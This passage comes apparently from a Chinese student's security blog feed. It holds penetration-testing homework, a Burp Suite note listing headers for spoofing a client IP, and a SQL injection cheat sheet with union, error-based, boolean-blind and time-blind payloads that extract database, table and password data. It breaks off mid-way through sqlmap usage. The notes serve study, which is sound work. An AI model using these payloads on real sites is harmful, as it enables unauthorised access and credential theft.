&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target element not found\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No2</title>
      <link href="/2023/12/06/%E4%BD%9C%E4%B8%9A2/"/>
      <url>/2023/12/06/%E4%BD%9C%E4%B8%9A2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1.与ZoomEye功能类似的搜索引擎还有哪些？</p><p>2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。</p><p>3.子域名收集，截图。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>与ZoomEye功能类似的搜索引擎还有哪些？</p><p> 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括：</p><ol><li><p>Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。</p></li><li><p>BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。</p></li><li><p>Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。</p></li><li><p>Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。</p></li></ol><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>利用ZoomEye进行相关搜索，截图，发布到自己的Blog</p><p>回答：搜索  领势 Compact Wireless-G 网络视频摄像机 http服务器</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113341.png"></p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>子域名收集，截图。</p><p>回答：搜索 <a href="https://www.baidu.com/">百度</a> 的子域名</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113825.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No1</title>
      <link href="/2023/12/05/%E4%BD%9C%E4%B8%9A1/"/>
      <url>/2023/12/05/%E4%BD%9C%E4%B8%9A1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？<br>2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？<br>3、对于1、2的结果，进行总结分析。<br>注：网络配置发生变化，建议重启网卡（操作命令见PPT）<br>作业发布到自己blog备查。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134440.png"></p><p>回答：不能</p><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134748.png"></p><p>回答：能</p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>对于1、2的结果，进行总结分析。</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05135040.png"></p><p>回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit使用</title>
      <link href="/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="更改数据包"><a href="#更改数据包" class="headerlink" title="更改数据包"></a>更改数据包</h1><h2 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h2><p>将请求改为如下</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/20210307160419616.png" alt="img"></p><h2 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h2><p>使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1podW9xaWFuXzE=,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="伪造IP"><a href="#伪造IP" class="headerlink" title="伪造IP"></a>伪造IP</h2><p>随便加一行：</p><p>X-Forwarded-For:127.0.0.1<br>X-Forwarded:127.0.0.1<br>Forwarded-For:127.0.0.1<br>Forwarded:127.0.0.1<br>X-Forwarded-Host:127.0.0.1<br>X-remote-IP:127.0.0.1<br>X-remote-addr:127.0.0.1<br>True-Client-IP:127.0.0.1<br>X-Client-IP:127.0.0.1<br>Client-IP:127.0.0.1<br>X-Real-IP:127.0.0.1<br>Ali-CDN-Real-IP:127.0.0.1<br>Cdn-Src-Ip:127.0.0.1<br>Cdn-Real-Ip:127.0.0.1<br>CF-Connecting-IP:127.0.0.1<br>X-Cluster-Client-IP:127.0.0.1<br>WL-Proxy-Client-IP:127.0.0.1<br>Proxy-Client-IP:127.0.0.1<br>Fastly-Client-Ip:127.0.0.1<br>True-Client-Ip:127.0.0.1</p><h2 id="伪造浏览器和设备"><a href="#伪造浏览器和设备" class="headerlink" title="伪造浏览器和设备"></a>伪造浏览器和设备</h2><p>修改User-Agent</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/49ce71eee9ae4be493f524a6b7c55ef4.png" alt="img"></p><h2 id="伪造网址"><a href="#伪造网址" class="headerlink" title="伪造网址"></a>伪造网址</h2><p>修改referer</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/e1f82347a0de4a8193faac4b54fcf703.png" alt="img"></p><h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/11/20/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/11/20/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL操作"><a href="#MySQL操作" class="headerlink" title="MySQL操作"></a>MySQL操作</h1><h2 id="登陆："><a href="#登陆：" class="headerlink" title="登陆："></a>登陆：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u [用户名] <span class="operator">-</span>p</span><br></pre></td></tr></table></figure><h2 id="查询用户名所有数据库："><a href="#查询用户名所有数据库：" class="headerlink" title="查询用户名所有数据库："></a>查询用户名所有数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><h2 id="创建数据库："><a href="#创建数据库：" class="headerlink" title="创建数据库："></a>创建数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database [数据库名]；</span><br></pre></td></tr></table></figure><h2 id="删除数据库："><a href="#删除数据库：" class="headerlink" title="删除数据库："></a>删除数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [数据库名] ;</span><br></pre></td></tr></table></figure><h2 id="使用数据库："><a href="#使用数据库：" class="headerlink" title="使用数据库："></a>使用数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use [数据库名];</span><br></pre></td></tr></table></figure><h2 id="查询数据库中的表："><a href="#查询数据库中的表：" class="headerlink" title="查询数据库中的表："></a>查询数据库中的表：</h2><p>show tables;</p><h2 id="创建表："><a href="#创建表：" class="headerlink" title="创建表："></a>创建表：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [表名]</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="更改数据表名："><a href="#更改数据表名：" class="headerlink" title="更改数据表名："></a>更改数据表名：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> [原数据表名] <span class="keyword">to</span> [新数据表名]</span><br></pre></td></tr></table></figure><h2 id="向数据表中插入数据："><a href="#向数据表中插入数据：" class="headerlink" title="向数据表中插入数据："></a>向数据表中插入数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> [数据表名]  (id ,name,age) <span class="keyword">values</span> (<span class="number">1</span>,&quot;tom&quot; <span class="number">19</span>);</span><br></pre></td></tr></table></figure><h2 id="向数据表中擦插入新的列："><a href="#向数据表中擦插入新的列：" class="headerlink" title="向数据表中擦插入新的列："></a>向数据表中擦插入新的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] [列名] [列的数据类型]；</span><br></pre></td></tr></table></figure><h2 id="更改数据表中的数据："><a href="#更改数据表中的数据：" class="headerlink" title="更改数据表中的数据："></a>更改数据表中的数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> [数据表名] <span class="keyword">set</span> name<span class="operator">=</span>&quot;lisa&quot; <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--修改id=1的行name为lisa</span></span><br></pre></td></tr></table></figure><h2 id="删除数据表中的列："><a href="#删除数据表中的列：" class="headerlink" title="删除数据表中的列："></a>删除数据表中的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] <span class="keyword">drop</span> [列名]</span><br></pre></td></tr></table></figure><h2 id="删除数据表中的行："><a href="#删除数据表中的行：" class="headerlink" title="删除数据表中的行："></a>删除数据表中的行：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除id=1的行</span></span><br></pre></td></tr></table></figure><h2 id="查询数据表的包涵数据："><a href="#查询数据表的包涵数据：" class="headerlink" title="查询数据表的包涵数据："></a>查询数据表的包涵数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id <span class="keyword">in</span> (‘<span class="number">3</span>’)；</span><br><span class="line"></span><br><span class="line"><span class="comment">--在数据表中查询id中包涵‘3’的数据</span></span><br></pre></td></tr></table></figure><h2 id="联合查询："><a href="#联合查询：" class="headerlink" title="联合查询："></a>联合查询：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  country <span class="keyword">from</span> [数据表名<span class="number">1</span>] <span class="keyword">union</span> <span class="keyword">select</span> country <span class="keyword">from</span> [数据表名<span class="number">2</span>] <span class="keyword">order</span> country;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询数据表1和数据表2中不同的country</span></span><br></pre></td></tr></table></figure><h2 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--asc升序，desc降序</span></span><br></pre></td></tr></table></figure><h1 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h1><h2 id="数字-字符型注入："><a href="#数字-字符型注入：" class="headerlink" title="数字&#x2F;字符型注入："></a>数字&#x2F;字符型注入：</h2><h3 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据表列数："><a href="#查询网站所用数据表列数：" class="headerlink" title="查询网站所用数据表列数："></a>查询网站所用数据表列数：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据数据库"><a href="#查询网站所用数据数据库" class="headerlink" title="查询网站所用数据数据库"></a>查询网站所用数据数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--select 后面的数量要与users列数相同</span></span><br></pre></td></tr></table></figure><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata（查库）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/03adab05919941189102ef074eb877ae.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>库名（查表)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/0750bef379b94e94861a46b764063d25.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>[数据库名] <span class="keyword">and</span> table_name<span class="operator">=</span>[表名]（查列）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/86afe7800fab4b8a875adb17e3eb653a.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> 库名.表名（查数据)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/274c6c2ae5ce494b9adf0b52bf3144f9.png" alt="img"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()))))</span><br><span class="line"></span><br><span class="line">爆字段名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COIUMN_NAME) <span class="keyword">from</span> TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>① 0x7e&#x3D;’<del>’<br> ② concat(‘a’,‘b’)&#x3D;“ab”<br> ③ version()&#x3D;@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COLUMN_NAME)<span class="keyword">from</span> TABLE_NAME)),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="floor-："><a href="#floor-：" class="headerlink" title="floor()："></a><strong>floor()：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> TABLE_NAME limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。<br>布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。</p><p><strong>什么情况下考虑使用布尔盲注？</strong></p><pre><code>1. 该输入框存在注入点。2. 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</code></pre><p><strong>常用函数</strong></p><pre><code>1.length（str）函数 返回字符串的长度2.substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度3.ascii（）返回字符的ascii码，返回该字符对应的ascii码4.count（）：返回当前列的数量5.case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2</code></pre><p><strong>函数替换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样</span><br><span class="line"></span><br><span class="line">2.left（str，index）从左边第index开始截取</span><br><span class="line">3.right(str，index)从右边第index开始截取</span><br><span class="line">4.substring（str，index）从左边index开始截取</span><br><span class="line">5.mid（str，index，len）截取str从index开始，截取len的长度</span><br><span class="line">6.lpad（str，len，padstr）</span><br><span class="line">7.rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</span><br><span class="line">8.如果程序过滤了 = （等于号），可以用in()、like代替，效果一样：</span><br><span class="line">9.如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>布尔盲注一般流程</strong></p><p>因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">①判断数据库名的长度：and length(database())&gt;11 回显正常；and length(database())&gt;12 回显错误，说明数据库名是等于12个字符。</span><br><span class="line">②猜测数据库名（使用ascii码来依次判断）：and (ascii(substr(database(),1,1)))&gt;100 --+ 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…</span><br><span class="line">③猜测表名：and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+ 往后继续猜测第二个、第三个字母…</span><br><span class="line">④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)&gt;105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.</span><br><span class="line">⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br>时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。</p><p><strong>什么情况下考虑使用时间盲注？</strong></p><ol><li>无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样</li><li>不会回显注入语句执行结果，故无法使用UNION注入</li><li>不会显示报错信息，故无法使用报错注入</li><li>符合盲注的特征，但不属于布尔型盲注</li></ol><p><strong>常用函数</strong></p><pre><code>sleep(n)：将程序挂起一段时间 n为n秒。if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+`   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。</code></pre><p><strong>时间盲注一般流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">①猜测数据库名称长度：</span><br><span class="line">输入：id=1&#x27; and If(length(database()) &gt; 1,1,sleep(5))--+</span><br><span class="line">用时：&lt;1s，数据库名称长度&gt;1</span><br><span class="line">…</span><br><span class="line">输入：id=1&#x27; and If(length(database()) &gt;8 ,1,sleep(5))--+</span><br><span class="line">用时：5s，数据库名称长度=8</span><br><span class="line">得出结论：数据库名称长度等于8个字符。</span><br><span class="line">②猜测数据库名称的一个字符：</span><br><span class="line">输入：id=1&#x27; and If(ascii(substr(database(),1,1))=97,sleep(5),1)--+</span><br><span class="line">用时：&lt;1s</span><br><span class="line">…</span><br><span class="line">输入：id=1&#x27; and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br><span class="line">用时：5s</span><br><span class="line">得出结论：数据库名称的第一个字符是小写字母s。</span><br><span class="line">改变substr的值，以此类推第n个字母。最后猜出数据库名称。</span><br><span class="line">③猜测数据库表名：先猜测长度，与上面内容相似。</span><br><span class="line">④猜测数据库字段：先猜测长度，与上面内容相似。</span><br><span class="line">⑤猜测字段内容：先猜测长度，与上面内容相似。</span><br></pre></td></tr></table></figure><h1 id="sqlmap使用："><a href="#sqlmap使用：" class="headerlink" title="sqlmap使用："></a>sqlmap使用：</h1><h3 id="指定位置注入"><a href="#指定位置注入" class="headerlink" title="指定位置注入"></a>指定位置注入</h3><p>1、-p，指定具体探测的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url -p id --dbs 